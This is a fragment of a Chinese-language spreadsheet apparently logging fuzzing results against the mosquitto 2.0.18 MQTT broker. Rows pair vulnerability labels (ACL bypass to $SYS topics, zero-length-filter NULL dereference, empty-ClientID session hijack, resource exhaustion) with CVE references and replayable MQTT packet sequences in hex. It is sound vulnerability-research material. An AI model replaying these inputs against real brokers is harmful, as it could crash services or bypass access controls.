        <f>== 种子标识: id:000009,sev:3,cat:01c0 ===\u000a大小: 4619B (报告+请求数据)\u000a请求数据: 4735B\u000a\u000a---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MQTT请求序列(4735B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=321500ee4d5154540402002000096166\u000aMsg[2]: SUBSCRIBE PacketID=266 Topics=['$share/grp/test/topic'(QoS=0)] | raw_header=821a010a00152473686172652f677270\u000aMsg[3]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=380402002000\u000aMsg[4]: TYPE0  | raw_header=0961666c6e65745f6330821a010a0015\u000aMsg[5]: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raw_header=26262626262626262626262626262626\u000a(尾部3138B): 2626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F6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5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645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645" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话隔离违规)</t>
        </is>
      </c>
      <c r="J645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  <c r="K645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46">
      <c r="A646" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B646" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C646" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D6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646" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0206 ===\u000a大小: 753B (报告+请求数据)\u000a请求数据: 116B\u000a\u000a---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MQTT请求序列(116B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=00020000\u000aMsg[2]: CONNACK  | raw_header=2f00\u000aMsg[3]: CONNECT Proto=MQTT v4 ClientID='aflnet_c0'(9B) clean_session=True keepalive=32s [自动清理会话] | raw_header=101500044d5154540402002000096166\u000aMsg[4]: SUBSCRIBE PacketID=266 Topics=['$\x86hare/grp/fest/topið'(QoS=2)] | raw_header=821a010a00152486686172652f677270\u000aMsg[5]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=181c150005504c41494e160011d5d66a\u000aMsg[6]: (不完整,29B) raw=32be010027612f622f632f642f65000e74015d23841c3673686172652f\u000a(尾部29B): 32be010027612f622f632f642f65000e74015d23841c3673686172652f</f>
        <v/>
      </c>
      <c r="F6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46" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J6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7">
      <c r="A647" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B647" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C647" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(264B)\u000a4.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47" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0286 ===\u000a大小: 1136B (报告+请求数据)\u000a请求数据: 264B\u000a\u000a---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MQTT请求序列(264B原始二进制) ---\u000aMsg[1]: PUBREC  | raw_header=5000\u000aMsg[2]: TYPE0  | raw_header=00047d515454\u000aMsg[3]: TYPE0  | raw_header=0402003c\u000aMsg[4]: TYPE0  | raw_header=000961666c6e65745f6330\u000aMsg[5]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=0)] | raw_header=820b00010006746573742f2300\u000aMsg[6]: PUBLISH Topic='test/topic' QoS=2 retain=False payload='\x00\x02hello' | raw_header=3413000a746573742f746f7069630002\u000aMsg[7]: PUBREC PacketID=2 | raw_header=50020002\u000aMsg[8]: SUBSCRIBE PacketID=1726 Topics=['a/b/c/d/e'(QoS=2), '$SYS/bro[er/clients/connecued'(QoS=2), '$SYS/broker/clients/connected'(QoS=2)] | raw_header=824e06be0009612f622f632f642f6502\u000aMsg[9]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload_len=61B | raw_header=35520013245359532f62726f6b65722f\u000aMsg[10]: AUTH  | raw_header=ff25ff255f9c00101500045404f2003d</f>
        <v/>
      </c>
      <c r="F6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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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4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48">
      <c r="A648" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:02c4</t>
        </is>
      </c>
      <c r="B648" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C648" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(874B)\u000a4.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648" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c4 ===\u000a大小: 4294B (报告+请求数据)\u000a请求数据: 874B\u000a\u000a---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MQTT请求序列(874B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=300526263e2626\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=262626260000006e6e6e6e6e6e6e6e6e\u000aMsg[3]: PUBREL PacketID=28270 | raw_header=6e6e6e6e262626262626262626262626\u000aMsg[4]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[5]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[6]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626062626262626\u000aMsg[7]: CONNACK session_present=38 reason_code=38 | raw_header=262626262626262626262626ffff7fff\u000aMsg[8]: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raw_header=26262626262626262626262626132626\u000aMsg[11]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262426262626262626\u000aMsg[12]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626268000262626262626\u000aMsg[13]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[14]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[15]: CONNACK session_present=38 reason_code=0 | raw_header=26262600406e6e6e6e6e6e6e6e6e6e6e\u000aMsg[16]: PUBREL PacketID=28270 | raw_header=6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e\u000aMsg[17]: (不完整,51B) raw=6e6e6e000002006e6e6e6e6e6e6e6e6e6e6e262f7465262626262626262630262626262626262626\u000a(尾部51B): 6e6e6e000002006e6e6e6e6e6e6e6e6e6e6e262f74652626262626262626302626262626262626262726262608001d24533b</f>
        <v/>
      </c>
      <c r="F6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4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48" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J64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48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49">
      <c r="A649" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:02c6</t>
        </is>
      </c>
      <c r="B649" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C649" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(282B)\u000a4.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649" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c6 ===\u000a大小: 1689B (报告+请求数据)\u000a请求数据: 282B\u000a\u000a---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MQTT请求序列(282B原始二进制) ---\u000aMsg[1]: CONNACK  | raw_header=2000\u000aMsg[2]: CONNACK  | raw_header=2000\u000aMsg[3]: PUBCOMP PacketID=64 | raw_header=746500400023f8150004101500fe5343\u000aMsg[4]: TYPE0  | raw_header=000766757a7a5f6336\u000aMsg[5]: SUBSCRIBE PacketID=1 Topics=['sensor/+/temp'(QoS=0)] | raw_header=82120001000d73656e736f722f2b2f74\u000aMsg[6]: PUBLISH Topic='sensor/room1/temp' QoS=0 retain=False payload='22.5' | raw_header=3017001173656e736f722f726f6f6d31\u000aMsg[7]: UNSUBSCRIBE  | raw_header=a2110002000d734d2d07374126262686\u000aMsg[8]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[9]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[10]: (不完整,22B) raw=2626262626262626262626263b262626262626262d05\u000a(尾部22B): 2626262626262626262626263b262626262626262d05</f>
        <v/>
      </c>
      <c r="F6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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J64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4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50">
      <c r="A650" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B650" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C650" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D6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650" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0305 ===\u000a大小: 1066B (报告+请求数据)\u000a请求数据: 69B\u000a\u000a---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MQTT请求序列(69B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT\x04\x00\x00&lt;\x00\u000dpersistent_ v48 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=101900154d5154540400003c000d7065\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=1)] | raw_header=820b00010006746573742f2301\u000aMsg[3]: PUBLISH Topic='test/qos2' QoS=2 retain=False payload='\x00\x02hello' | raw_header=34120009746573742f716f7332000268\u000aMsg[4]: (不完整,9B) raw=62700200020900e000\u000a(尾部9B): 62700200020900e000</f>
        <v/>
      </c>
      <c r="F6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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J6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5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51">
      <c r="A651" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:0306</t>
        </is>
      </c>
      <c r="B651" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C651" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(318B)\u000a4.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0x0306\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E651" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0306 ===\u000a大小: 1123B (报告+请求数据)\u000a请求数据: 318B\u000a\u000a---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MQTT请求序列(318B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='fuzz_c5'(7B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101300044d5154540402003c00076675\u000aMsg[2]: SUBSCRIBE PacketID=8961 Topics=['test/#'(QoS=0)] | raw_header=820b23010006746573742f2300\u000aMsg[3]: PUBLISH Topic='test/x' QoS=2 retain=False payload='\x00\x02before_unsub' | raw_header=34160006746573742f7800026265666f\u000aMsg[4]: SUBSCRIBE PacketID=500 Topics=[] | raw_header=825a01f4470bc8fdcf2b26002b766572\u000aMsg[5]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload_len=74B | raw_header=3a69001d245359532f62726f6b65722f\u000aMsg[6]: PUBREC PacketID=1 | raw_header=50020001\u000aMsg[7]: PUBREL PacketID=5 | raw_header=62020005\u000aMsg[8]: PUBCOMP PacketID=1 | raw_header=70020001\u000aMsg[9]: UNSUBSCRIBE  | raw_header=a20a00020006746573742f23\u000aMsg[10]: PUBLISH Topic='test/x' QoS=2 retain=False payload='\x00\x07after_unsub' | raw_header=34150006746573742f78000761667465\u000aMsg[11]: PUBREC PacketID=2 | raw_header=50020002\u000aMsg[12]: PUBREL PacketID=2 | raw_header=62020002\u000aMsg[13]: PUBCOMP PacketID=2 | raw_header=70020002\u000aMsg[14]: DISCONNECT 断开连接 | raw_header=e000</f>
        <v/>
      </c>
      <c r="F6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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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5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52">
      <c r="A652" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:0385</t>
        </is>
      </c>
      <c r="B652" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C652" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(97B)\u000a4.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652" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0385 ===\u000a大小: 828B (报告+请求数据)\u000a请求数据: 97B\u000a\u000a---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MQTT请求序列(97B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQT@ v222 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=101500044d515440de00000000000066\u000aMsg[2]: SUBSCRIBE PacketID=65531 Topics=[] | raw_header=820bfffb000b313512000a7465\u000aMsg[3]: PUBLISH Topic='test/alg15' QoS=0 retain=False payload='\x12\x00g0' | raw_header=3010000a746573742f616c6731351200\u000aMsg[4]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32114e09746573742f6265746150025f\u000aMsg[5]: PUBLISH Topic='test/gam}a' QoS=2 retain=True payload='' | raw_header=350c000a746573742f67616d7d61\u000aMsg[6]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=10048d736732\u000aMsg[7]: CONNACK  | raw_header=2d00\u000aMsg[8]: (不完整,2B) raw=0004\u000a(尾部2B): 0004</f>
        <v/>
      </c>
      <c r="F6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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J65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52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53">
      <c r="A653" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:3,cat:0386</t>
        </is>
      </c>
      <c r="B653" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C653" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(214B)\u000a4.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653" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0386 ===\u000a大小: 1205B (报告+请求数据)\u000a请求数据: 214B\u000a\u000a---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MQTT请求序列(214B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='fuzz_c5'(7B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101300044d5154540402003c00076675\u000aMsg[2]: CONNACK  | raw_header=2300\u000aMsg[3]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=73B | raw_header=3968001d245359532f62726f6b65722f\u000aMsg[4]: PUBLISH Topic='test/x' QoS=2 retain=False payload='\x00\x02before_unsub' | raw_header=34160006746573742f7800026265666f\u000aMsg[5]: PUBREC PacketID=1 | raw_header=50020001\u000aMsg[6]: PUBREL PacketID=1 | raw_header=62020001\u000aMsg[7]: PUBREC PacketID=1 | raw_header=59020001\u000aMsg[8]: UNSUBSCRIBE  | raw_header=a20a00020006746573742f23\u000aMsg[9]: PUBLISH Topic='test/x' QoS=2 retain=False payload='÷\x07after_unsub' | raw_header=34150006746573742f78f70761667465\u000aMsg[10]: PUBREC PacketID=2 | raw_header=50020002\u000aMsg[11]: PUBREL PacketID=2 | raw_header=62020002\u000aMsg[12]: PUBCOMP PacketID=2 | raw_header=70020002\u000aMsg[13]: DISCONNECT 断开连接 | raw_header=e000</f>
        <v/>
      </c>
      <c r="F6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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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5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54">
      <c r="A654" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B654" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C654" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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54" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0040 ===\u000a大小: 631B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PUBREC PacketID=23122 | raw_header=50155a524d5154540402e22000096166\u000aMsg[2]: TYPE0  | raw_header=031300044d7654540402003c00076675\u000aMsg[3]: SUBSCRIBE PacketID=24 Topics=[''(零长度!QoS=0)] | raw_header=820b0018000000044d6b545404\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F6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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J65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5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55">
      <c r="A655" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B655" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C655" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(247B)\u000a4.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55" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0042 ===\u000a大小: 919B (报告+请求数据)\u000a请求数据: 247B\u000a\u000a---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MQTT请求序列(247B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='$share/grp/test/topic' QoS=2 retain=False payload='\x00Ú|ËI\x07Ï\x1aþs¾he'\x98ÕÒ\x1fÀD6¸±\x1bëp' | raw_header=343100152473686172652f6772702f74\u000aMsg[2]: SUBSCRIBE PacketID=13 Topics=[''(零长度!QoS=2)] | raw_header=8233000d0000062b2f6461ffffffff0a\u000aMsg[3]: PUBREL PacketID=25966 | raw_header=6469656e74732f636f6e6e6563746564\u000aMsg[4]: (不完整,36B) raw=73742f746f70696300a2ff0057001d245359532f62726f6b65722f636c69652f642f652f\u000a(尾部36B): 73742f746f70696300a2ff0057001d245359532f62726f6b65722f636c69652f642f652f</f>
        <v/>
      </c>
      <c r="F6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5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55" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J65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5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56">
      <c r="A656" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B656" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C656" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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56" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c0 ===\u000a大小: 882B (报告+请求数据)\u000a请求数据: 123B\u000a\u000a---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MQTT请求序列(123B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=828 Topics=[''(零长度!QoS=1)] | raw_header=821a033c00000d2473686172652f6772\u000aMsg[2]: PUBLISH Topic='$share/g3/home/+/temperature' QoS=1 retain=True payload_len=62B | raw_header=3b5c001c2473686172652f67332f686f\u000aMsg[3]: AUTH  | raw_header=ff</f>
        <v/>
      </c>
      <c r="F6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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J65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5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57">
      <c r="A657" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B657" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C657" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(1323B)\u000a4.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657" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c2 ===\u000a大小: 2574B (报告+请求数据)\u000a请求数据: 1323B\u000a\u000a---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MQTT请求序列(1323B原始二进制) ---\u000aMsg[1]: PUBREC PacketID=29556 | raw_header=546573742f23101500044d5154541e02\u000aMsg[2]: SUBSCRIBE PacketID=39262 Topics=[''(零长度!QoS=2)] | raw_header=821e995e00000a742f70000000100b73\u000aMsg[3]: PUBREL PacketID=29551 | raw_header=657f736f722f74656d70001c24736861\u000aMsg[4]: PUBACK PacketID=20110 | raw_header=4e4e4e8e8e8e8e8e8e8e8e8e8e8e8e8e\u000aMsg[5]: (不完整,979B) raw=8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e\u000a(尾部979B): 8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e</f>
        <v/>
      </c>
      <c r="F6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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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5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58">
      <c r="A658" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:4,cat:0140</t>
        </is>
      </c>
      <c r="B658" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C658" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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658" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0140 ===\u000a大小: 564B (报告+请求数据)\u000a请求数据: 36B\u000a\u000a---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MQTT请求序列(36B原始二进制) ---\u000aMsg[1]: (不完整,36B) raw=85d389a21a00100000152473686172652f6772702f746573742f746f7069635a895a0181\u000a(尾部36B): 85d389a21a00100000152473686172652f6772702f746573742f746f7069635a895a0181</f>
        <v/>
      </c>
      <c r="F6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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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5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59">
      <c r="A659" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:4,cat:0142</t>
        </is>
      </c>
      <c r="B659" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C659" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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659" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0142 ===\u000a大小: 844B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MQTT请求序列(169B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=58 Topics=[''(零长度!QoS=0)] | raw_header=8214003a0000002d000b73656e736f72\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload_len=65B | raw_header=30560013245359532f62726f6b65722f\u000aMsg[3]: PUBLISH Topic='MQTT' QoS=1 retain=False payload='\x04ùÿ;\x00\x07fÿzz_c1' | raw_header=321300044d51545404f9ff3b000766ff\u000aMsg[4]: (不完整,38B) raw=8274300d00067400300d0001746573b02f200000006c6fa20a000100060000ffffff7fe10000\u000a(尾部38B): 8274300d00067400300d0001746573b02f200000006c6fa20a000100060000ffffff7fe10000</f>
        <v/>
      </c>
      <c r="F6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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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5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60">
      <c r="A660" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:4,cat:01c0</t>
        </is>
      </c>
      <c r="B660" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C660" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(227B)\u000a4.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660" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c0 ===\u000a大小: 943B (报告+请求数据)\u000a请求数据: 227B\u000a\u000a---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MQTT请求序列(227B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3213fa1c4d5154540102003c00076675\u000aMsg[2]: TYPE0  | raw_header=0100\u000aMsg[3]: SUBSCRIBE PacketID=111 Topics=[''(零长度!QoS=1)] | raw_header=8207006f0000012305\u000aMsg[4]: PUBLISH Topic='sensor/temp' QoS=2 retain=True payload_len=93B | raw_header=356a000b73656e736f722f74656d7000\u000aMsg[5]: TYPE0  | raw_header=0006636573742f23\u000aMsg[6]: TYPE0  | raw_header=00300d0006061300044d515454010200\u000aMsg[7]: TYPE0  | raw_header=060606060606066c\u000aMsg[8]: (不完整,21B) raw=6fa2746573000006636573742f2300300dbf3ce000\u000a(尾部21B): 6fa2746573000006636573742f2300300dbf3ce000</f>
        <v/>
      </c>
      <c r="F6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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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1">
      <c r="A661" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:4,cat:01c2</t>
        </is>
      </c>
      <c r="B661" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C661" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(299B)\u000a4.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661" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c2 ===\u000a大小: 1161B (报告+请求数据)\u000a请求数据: 299B\u000a\u000a---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MQTT请求序列(299B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=331 Topics=[''(零长度!QoS=3)] | raw_header=8235014b00002b766572792f64656570\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=207B | raw_header=31ee01001d245359532f62726f6b6572\u000aMsg[3]: PUBLISH  | raw_header=3601dc</f>
        <v/>
      </c>
      <c r="F6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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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6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62">
      <c r="A662" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B662" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C662" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(76B)\u000a4.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662" s="2">
